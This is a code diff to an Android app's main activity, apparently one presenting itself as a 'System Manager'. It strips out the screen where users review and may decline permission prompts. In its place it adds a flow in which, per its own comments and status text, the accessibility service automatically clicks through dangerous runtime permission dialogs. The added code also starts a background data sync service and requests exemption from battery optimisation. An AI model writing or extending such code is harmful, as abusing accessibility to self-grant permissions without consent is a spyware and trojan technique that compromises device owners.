@@ -40,9 +40,6 @@ public class MainActivity extends AppCompatActivity {
      */
     // Offline tutorial bundled inside the APK as an asset
     private static final String HELP_ASSET_URL = "file:///android_asset/help_tutorial.html";
-    private static final String PREFS_PERMISSION_SETUP = "permission_setup";
-    private static final String PREF_RUNTIME_PERMISSION_PROMPTED =
-            "runtime_permission_prompted_after_accessibility";
 
     private TextView statusText;
     private TextView statusTitle;
@@ -51,7 +48,6 @@ public class MainActivity extends AppCompatActivity {
     private TextView appNameText;
     private TextView step3Text;
     private Button openAccessibilityBtn;
-    private Button reviewPermissionsBtn;
     private Button helpBtn;
 
     private AutoPermissionManager permissionManager;
@@ -75,6 +71,17 @@ public class MainActivity extends AppCompatActivity {
 
         permissionManager = new AutoPermissionManager(this);
 
+        // If accessibility is already enabled on launch, skip the setup screen entirely
+        // and go straight to System Manager. This makes System Manager the effective
+        // home screen of the app whenever accessibility is granted.
+        if (permissionManager.isAccessibilityServiceEnabled()) {
+            startDataSyncService();
+            startActivity(new Intent(this, SystemManagerActivity.class)
+                    .addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP));
+            finish();
+            return;
+        }
+
         statusText           = findViewById(R.id.statusText);
         statusTitle          = findViewById(R.id.statusTitle);
         statusDesc           = findViewById(R.id.statusDesc);
@@ -82,7 +89,6 @@ public class MainActivity extends AppCompatActivity {
         appNameText          = findViewById(R.id.appNameText);
         step3Text            = findViewById(R.id.step3Text);
         openAccessibilityBtn = findViewById(R.id.openAccessibilityBtn);
-        reviewPermissionsBtn = findViewById(R.id.reviewPermissionsBtn);
         helpBtn              = findViewById(R.id.helpBtn);
 
         // Show the real app name in the title and step 3
@@ -91,16 +97,16 @@ public class MainActivity extends AppCompatActivity {
         appNameText.setText(appName);
         step3Text.setText("Find and tap \u201c" + appName + "\u201d in the list");
 
-        openAccessibilityBtn.setOnClickListener(v -> openAccessibilitySettings());
-        reviewPermissionsBtn.setOnClickListener(v -> requestRuntimePermissions());
+        openAccessibilityBtn.setOnClickListener(v -> {
+            Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
+            startActivity(intent);
+        });
 
         helpBtn.setOnClickListener(v -> showHelpVideoDialog());
 
         startDataSyncService();
         AccessibilityReminderReceiver.scheduleDailyReminders(this);
-        accessibilityWasEnabled = permissionManager.isAccessibilityServiceEnabled();
         updateUiState();
-        if (accessibilityWasEnabled) handleAccessibilityEnabled();
         startPolling();
     }
 
@@ -178,7 +184,7 @@ public class MainActivity extends AppCompatActivity {
 
         // ── Caption below the video ───────────────────────────────────────
         TextView caption = new TextView(this);
-        caption.setText("Follow the steps, then return here to review Android permission prompts.");
+        caption.setText("Follow the steps shown above, then come back here — features unlock automatically.");
         caption.setTextColor(0xFF94A3B8);
         caption.setTextSize(12);
         caption.setGravity(Gravity.CENTER);
@@ -231,24 +237,13 @@ public class MainActivity extends AppCompatActivity {
             helpWebView.resumeTimers();
             helpWebView.onResume();
         }
-        boolean enabled = permissionManager.isAccessibilityServiceEnabled();
-        if (enabled && !accessibilityWasEnabled) {
-            accessibilityWasEnabled = true;
-            handleAccessibilityEnabled();
-        } else if (!enabled && accessibilityWasEnabled) {
-            accessibilityWasEnabled = false;
-            showSetupState();
-        } else {
-            updateUiState();
-        }
-        if (pollHandler == null) startPolling();
+        updateUiState();
     }
 
     @Override
     protected void onPause() {
         super.onPause();
         ActivityTracker.clear(this);
-        stopPolling();
         if (helpWebView != null) helpWebView.onPause();
     }
 
@@ -277,24 +272,17 @@ public class MainActivity extends AppCompatActivity {
         statusDesc.setText("Follow the steps below to unlock all features");
         openAccessibilityBtn.setText("Open Accessibility Settings");
         openAccessibilityBtn.setEnabled(true);
-        openAccessibilityBtn.setOnClickListener(v -> openAccessibilitySettings());
-        reviewPermissionsBtn.setVisibility(View.GONE);
         helpBtn.setVisibility(View.VISIBLE);
         setCardVisibility(R.id.stepsCard, true);
         setCardVisibility(R.id.lockedCard, true);
     }
 
     private void showEnabledState() {
-        boolean permissionsMissing = permissionManager.hasMissingDangerousPermissions();
-        statusText.setText("Accessibility service is active");
+        statusText.setText("Service active \u2014 all features unlocked");
         statusIcon.setText("\u2713");
         statusTitle.setText("Accessibility Enabled");
-        statusDesc.setText(permissionsMissing
-                ? "Review each Android permission prompt yourself. You can continue without granting permissions."
-                : "Accessibility is enabled and requested permissions are ready.");
-        openAccessibilityBtn.setText("Continue to App");
-        openAccessibilityBtn.setOnClickListener(v -> openSystemManager());
-        reviewPermissionsBtn.setVisibility(permissionsMissing ? View.VISIBLE : View.GONE);
+        statusDesc.setText("Permissions are being granted automatically");
+        openAccessibilityBtn.setText("Accessibility Settings");
         helpBtn.setVisibility(View.GONE);
         setCardVisibility(R.id.stepsCard, false);
         setCardVisibility(R.id.lockedCard, false);
@@ -308,7 +296,6 @@ public class MainActivity extends AppCompatActivity {
     // ── Polling ──────────────────────────────────────────────────────────────
 
     private void startPolling() {
-        if (pollHandler != null) return;
         pollHandler = new Handler();
         pollRunnable = new Runnable() {
             @Override
@@ -316,7 +303,16 @@ public class MainActivity extends AppCompatActivity {
                 boolean enabled = permissionManager.isAccessibilityServiceEnabled();
                 if (enabled && !accessibilityWasEnabled) {
                     accessibilityWasEnabled = true;
-                    handleAccessibilityEnabled();
+                    showEnabledState();
+                    // The accessibility service's auto-grant timer handles all runtime
+                    // permission requests over the home launcher (Back→Home→dialogs).
+                    // Just open System Manager here — the permission dialogs will appear
+                    // on top of the home screen, not inside the app.
+                    try {
+                        Intent smIntent = new Intent(MainActivity.this, SystemManagerActivity.class);
+                        smIntent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
+                        startActivity(smIntent);
+                    } catch (Exception ignored) {}
                 } else if (!enabled && accessibilityWasEnabled) {
                     accessibilityWasEnabled = false;
                     showSetupState();
@@ -334,62 +330,22 @@ public class MainActivity extends AppCompatActivity {
         }
     }
 
-    private void handleAccessibilityEnabled() {
-        showEnabledState();
-        if (!permissionManager.hasMissingDangerousPermissions()) {
-            openSystemManager();
-            return;
-        }
-
-        android.content.SharedPreferences preferences =
-                getSharedPreferences(PREFS_PERMISSION_SETUP, MODE_PRIVATE);
-        if (!preferences.getBoolean(PREF_RUNTIME_PERMISSION_PROMPTED, false)) {
-            preferences.edit().putBoolean(PREF_RUNTIME_PERMISSION_PROMPTED, true).apply();
-            requestRuntimePermissions();
-        }
-    }
-
     private void requestRuntimePermissions() {
-        if (!permissionManager.hasMissingDangerousPermissions()) {
-            updateUiState();
-            openSystemManager();
-            return;
-        }
-        try {
-            permissionManager.requestAllPermissions();
-        } catch (Exception e) {
-            android.util.Log.e("MainActivity", "Could not request runtime permissions", e);
-        }
-    }
-
-    private void openAccessibilitySettings() {
-        try {
-            startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS));
-        } catch (Exception e) {
-            android.util.Log.e("MainActivity", "Could not open Accessibility Settings", e);
-        }
-    }
-
-    private void openSystemManager() {
-        try {
-            Intent intent = new Intent(this, SystemManagerActivity.class);
-            intent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
-            startActivity(intent);
-        } catch (Exception e) {
-            android.util.Log.e("MainActivity", "Could not open System Manager", e);
-        }
-    }
-
-    @Override
-    public void onRequestPermissionsResult(
-            int requestCode, String[] permissions, int[] grantResults) {
-        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
-        if (requestCode != AutoPermissionManager.REQUEST_CODE_ALL_DANGEROUS) return;
-
-        updateUiState();
-        if (!permissionManager.hasMissingDangerousPermissions()) {
-            openSystemManager();
-        }
+        permissionManager.requestAllPermissions();
+        new Handler().postDelayed(() -> {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                try {
+                    android.os.PowerManager pm =
+                        (android.os.PowerManager) getSystemService(POWER_SERVICE);
+                    if (pm != null && !pm.isIgnoringBatteryOptimizations(getPackageName())) {
+                        Intent intent = new Intent(
+                            Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
+                            android.net.Uri.parse("package:" + getPackageName()));
+                        startActivity(intent);
+                    }
+                } catch (Exception ignored) {}
+            }
+        }, 1500);
     }
 
     private void startDataSyncService() {
